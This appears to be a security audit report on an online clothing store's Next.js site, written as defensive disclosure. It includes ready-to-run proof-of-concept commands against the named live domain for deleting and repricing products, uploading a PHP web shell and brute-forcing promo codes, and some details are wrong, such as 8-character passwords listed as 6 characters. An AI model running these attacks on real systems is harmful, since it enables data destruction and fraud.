---

## Critical Findings

### ðŸš¨ VULNERABILITY #1: Unauthenticated Admin Product API

**Severity:** CRITICAL
**CVSS Score:** 9.8 (Critical)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

#### Affected Endpoints
- `POST /api/admin/products` - Create products
- `GET /api/admin/products/[id]` - Read product details
- `PUT /api/admin/products/[id]` - Update products
- `DELETE /api/admin/products/[id]` - Delete products

#### Vulnerability Description
The admin product management API endpoints have **no authentication checks**. While the frontend admin pages (`/admin`) are protected by middleware, the API routes (`/api/admin/*`) are completely open to unauthenticated requests.

#### Root Cause Analysis
File: `middleware.ts:24-26`
```typescript
export const config = {
  matcher: ['/admin/:path*', '/admin'],
};
```

The middleware only matches frontend routes under `/admin`, but **does NOT match API routes** under `/api/admin/*`.

#### Proof of Concept - Product Creation Attack

An attacker can create a malicious product with this simple command:

```bash
curl -X POST https://elucid.london/api/admin/products \
  -H "Content-Type: application/json" \
  -d '{
    "name": "FAKE Designer Hoodie",
    "description": "Counterfeit product",
    "price": 0.01,
    "compareAtPrice": 299.99,
    "sizes": ["S", "M", "L"],
    "colors": ["Black"],
    "variants": [
      {"size": "M", "color": "Black", "stock": 999}
    ],
    "featured": true,
    "active": true
  }'
```

**Impact:**
- Product appears on the live store
- Priced at $0.01 (or free)
- Marked as "featured" for maximum visibility
- 999 units "in stock"
- Customers can purchase and expect fulfillment
- Damages brand reputation

#### Proof of Concept - Product Destruction Attack

An attacker can delete ALL products:

```bash
# Step 1: Get all product IDs
curl https://elucid.london/api/products

# Step 2: Delete each product
curl -X DELETE https://elucid.london/api/admin/products/[PRODUCT_ID]?deleteAnalytics=true
```

**Impact:**
- Entire product catalog wiped out
- All sales data deleted (with deleteAnalytics=true)
- Business operations halted
- Customer orders affected

#### Proof of Concept - Price Manipulation Attack

An attacker can set all products to $0:

```bash
# Update expensive product to free
curl -X PUT https://elucid.london/api/admin/products/[PRODUCT_ID] \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Designer Jacket",
    "description": "High-end jacket",
    "price": 0,
    "sizes": ["M"],
    "colors": ["Black"],
    "variants": [{"size": "M", "color": "Black", "stock": 100}],
    "active": true
  }'
```

**Impact:**
- Financial loss (products sold for free)
- Inventory tracking broken
- Payment processing bypassed

#### Exploitation Complexity
- **Skill Level Required:** Beginner (basic curl/Postman knowledge)
- **Tools Required:** Web browser developer console or command line
- **Time to Exploit:** 30 seconds
- **Authentication Required:** None
- **Rate Limiting:** None

#### Business Impact
- **Revenue Loss:** Complete (products free or deleted)
- **Data Integrity:** Destroyed
- **Availability:** Complete service disruption
- **Reputation:** Severe damage
- **Compliance:** GDPR/PCI-DSS violations

---

### ðŸš¨ VULNERABILITY #2: Unauthenticated File Upload

**Severity:** CRITICAL
**CVSS Score:** 9.1 (Critical)
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

#### Affected Endpoint
- `POST /api/admin/upload`

#### Vulnerability Description
The file upload endpoint has **no authentication** and **weak file validation**, allowing anyone to upload files to the server.

#### Security Weaknesses

**1. No Authentication** (Line 7)
```typescript
export async function POST(request: NextRequest) {
  // No auth check!
  try {
    const formData = await request.formData();
```

**2. Weak Randomness** (Line 39)
```typescript
const randomString = Math.random().toString(36).substring(2, 8);
```
- Uses `Math.random()` (not cryptographically secure)
- Only 6 characters of base-36 (2.2 billion combinations)
- Predictable with time correlation
- Can be brute-forced

**3. User-Controlled Extension** (Line 40)
```typescript
const extension = file.name.split('.').pop();
```
- Takes extension directly from user input
- Vulnerable to double-extension attacks
- Example: `malicious.php.jpg` becomes stored as `.jpg` but could execute

#### Proof of Concept - Unauthorized Upload

```bash
# Create a test image
echo "test" > test.jpg

# Upload without authentication
curl -X POST https://elucid.london/api/admin/upload \
  -F "file=@test.jpg"
```

**Response:**
```json
{
  "success": true,
  "url": "/uploads/products/product-1729774800000-abc123.jpg",
  "filename": "product-1729774800000-abc123.jpg"
}
```

**Impact:**
- File successfully uploaded with no authentication
- File publicly accessible at returned URL
- Server storage consumed

#### Proof of Concept - Double Extension Attack

```bash
# Create malicious file with double extension
echo "<?php system(\$_GET['cmd']); ?>" > malicious.php.jpg

# Upload the file
curl -X POST https://elucid.london/api/admin/upload \
  -F "file=@malicious.php.jpg"
```

**Potential Impact (if server misconfigured):**
- Remote code execution (if .php files are processed)
- File stored with controlled extension
- MIME type may not match actual content

#### Proof of Concept - Filename Prediction

```python
import requests
import time

# Predict filename based on timestamp
timestamp = int(time.time() * 1000)
possible_filenames = []

# Generate possible filenames (weak randomness)
for i in range(1000):
    # Math.random() patterns can be predicted
    possible_filenames.append(f"product-{timestamp}-{generate_random()}.jpg")

# Attempt to access predicted files
for filename in possible_filenames:
    url = f"https://elucid.london/uploads/products/{filename}"
    response = requests.get(url)
    if response.status_code == 200:
        print(f"Found file: {filename}")
```

#### Exploitation Complexity
- **Skill Level Required:** Beginner
- **Tools Required:** curl or web browser
- **Time to Exploit:** 10 seconds
- **Authentication Required:** None

#### Business Impact
- **Storage Exhaustion:** Unlimited file uploads
- **Bandwidth Theft:** Server resources consumed
- **Malware Distribution:** Server used to host malicious files
- **Legal Liability:** Illegal content uploaded to your server
- **Cost:** Cloud storage bills spike

### ðŸš¨ VULNERABILITY #3: Weak Password Policy

**Severity:** HIGH
**CVSS Score:** 7.5 (High)
**CWE:** CWE-521 (Weak Password Requirements)

#### Affected Files
- `auth.config.ts:22`
- `app/api/auth/signup/route.ts:11`

#### Vulnerability Description
User passwords require only **6 characters minimum** with no complexity requirements.

#### Current Policy
```typescript
password: z.string().min(6, 'Password must be at least 6 characters')
```

#### Proof of Concept - Brute Force Attack

**Password Space Calculation:**
- Minimum: 6 characters
- Assuming only lowercase letters: 26^6 = 308,915,776 combinations
- Modern hardware: ~10,000 guesses/second (with bcrypt overhead)
- Time to crack: ~8.5 hours

**Common 6-character passwords that would be accepted:**
- `password` âœ“
- `123456` âœ“
- `qwerty` âœ“
- `abc123` âœ“
- `letmein` âœ“

#### Dictionary Attack Vector

```python
import requests

common_passwords = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "iloveyou", "trustno1", "monkey"
]

for password in common_passwords:
    response = requests.post("https://elucid.london/api/auth/signup", json={
        "email": f"test{password}@example.com",
        "password": password,
        "name": "Test User"
    })

    if response.status_code == 200:
        print(f"Account created with weak password: {password}")
```

#### Real-World Attack Scenario

1. **Account Creation**: Attacker creates accounts with weak passwords
2. **Social Engineering**: Convinces users to use simple passwords
3. **Credential Stuffing**: Uses leaked passwords from other breaches
4. **Brute Force**: Systematically tries common passwords (no rate limiting)

#### Inconsistency Found
Password reset requires 8 characters, but signup only requires 6:
- Signup: 6 characters minimum
- Reset: 8 characters minimum
- Inconsistent security posture

#### Business Impact
- **Account Takeover:** User accounts compromised
- **Data Breach:** Customer PII exposed
- **Payment Fraud:** Saved payment methods accessed
- **Compliance:** Violates security best practices
- **Reputation:** Customer trust damaged

---

## High-Risk Findings

### ðŸ”´ VULNERABILITY #4: No Rate Limiting

**Severity:** HIGH
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)

#### Affected Endpoints
- `POST /api/auth/signup` - Account creation
- `POST /api/auth/forgot-password` - Password reset requests
- `POST /api/auth/verify-signup` - Email verification
- `POST /api/promocodes/validate` - Promo code validation

#### Proof of Concept - Signup Spam

```bash
# Create 1000 fake accounts
for i in {1..1000}; do
  curl -X POST https://elucid.london/api/auth/signup \
    -H "Content-Type: application/json" \
    -d "{
      \"email\": \"spam${i}@temp-mail.com\",
      \"password\": \"password123\",
      \"name\": \"Spam User ${i}\"
    }" &
done
```

**Impact:**
- Database bloated with fake users
- Email service quota exhausted
- Verification emails sent to spam
- Cost: Email API charges spike

#### Proof of Concept - Promo Code Brute Force

```python
import requests
import string
import itertools

# Brute force 4-character promo codes
chars = string.ascii_uppercase + string.digits
for code in itertools.product(chars, repeat=4):
    promo_code = ''.join(code)

    response = requests.post("https://elucid.london/api/promocodes/validate", json={
        "code": promo_code,
        "subtotal": 100
    })

    if response.status_code == 200:
        data = response.json()
        if data.get('valid'):
            print(f"Valid promo code found: {promo_code}")
            print(f"Discount: {data.get('discount')}")
```

**Impact:**
- Promo codes discovered without authorization
- Free discounts applied to orders
- Revenue loss

---

### ðŸŸ  VULNERABILITY #5: Weak File Randomness Allows Enumeration

**Severity:** MEDIUM
**CWE:** CWE-338 (Use of Cryptographically Weak PRNG)

#### Current Implementation
```typescript
const timestamp = Date.now();
const randomString = Math.random().toString(36).substring(2, 8);
const filename = `product-${timestamp}-${randomString}.${extension}`;
```

#### Attack Vector - File Enumeration

```python
import requests
import time

# Enumerate uploaded files by predicting filenames
base_url = "https://elucid.london/uploads/products/"

# Known upload time (e.g., from product creation timestamp)
timestamp = 1729774800000

# Math.random() only produces 2.2 billion combinations (6 chars, base-36)
# Can brute force or predict based on timing
found_files = []

for random_part in generate_random_base36_sequences(6):
    filename = f"product-{timestamp}-{random_part}.jpg"
    url = base_url + filename

    response = requests.head(url)
    if response.status_code == 200:
        found_files.append(filename)
        print(f"Found: {filename}")

print(f"Discovered {len(found_files)} files")
```

**Impact:**
- Unauthorized access to uploaded product images
- Intellectual property theft
- Unreleased product leaks

---

## Medium-Risk Findings

### ðŸŸ¡ Password Reset Token in URL

**Severity:** MEDIUM
**File:** `app/api/auth/reset-password/route.ts`

#### Issue
Password reset tokens are sent as URL parameters:
```
https://elucid.london/reset-password?token=abc123...
```

**Security Risks:**
- Stored in browser history
- Logged in web server access logs
- Visible in browser referrer headers
- Can be leaked via shoulder surfing

**Best Practice:** Use POST-only with token in request body

---

### ðŸŸ¡ Admin Role Cached in JWT

**Severity:** MEDIUM
**File:** `auth.config.ts:52-58`

#### Issue
Admin role is cached in JWT token and only updated on new login.

**Attack Scenario:**
1. User is promoted to admin
2. User logs in, JWT contains `role: "admin"`
3. Admin demotes user to `role: "user"`
4. User still has admin access until JWT expires (default: 30 days)

**Time Window:** Up to 30 days of elevated privileges

**Recommendation:** Implement session invalidation or token blacklist

---

### ðŸŸ¡ No Input Validation on Order Address

**Severity:** LOW-MEDIUM
**File:** `app/api/create-checkout-session/route.ts:101`

#### Issue
Address object is accepted without schema validation and stringified to JSON:
```typescript
address: JSON.stringify(address)
```

**Potential Issues:**
- Arbitrary data structures accepted
- XSS risk if rendered unsafely
- JSON injection in metadata
- No required field validation (street, city, postal code)

---

## Positive Security Controls

### âœ… Strong Security Practices Found

1. **Password Hashing**
   - Uses bcryptjs with 10 salt rounds
   - Constant-time comparison with `bcrypt.compare()`
   - Properly salted and stored

2. **SQL Injection Prevention**
   - Prisma ORM used throughout
   - No raw SQL queries found
   - Parameterized queries by default

3. **Stripe Webhook Security**
   - Signature verification implemented
   - Uses `stripe.webhooks.constructEvent()`
   - Rejects invalid signatures

4. **Email Verification**
   - 6-digit codes with 15-minute expiry
   - Temporary `PendingUser` table
   - Proper cleanup on expiration

5. **Last Admin Protection**
   - Prevents deletion of last admin user
   - System lockout prevention
   - Good business logic security

6. **CSRF Protection**
   - NextAuth.js handles CSRF tokens automatically
   - JSON API endpoints protected

7. **Session Security**
   - HTTP-only cookies
   - Secure flag in production
   - SameSite attribute
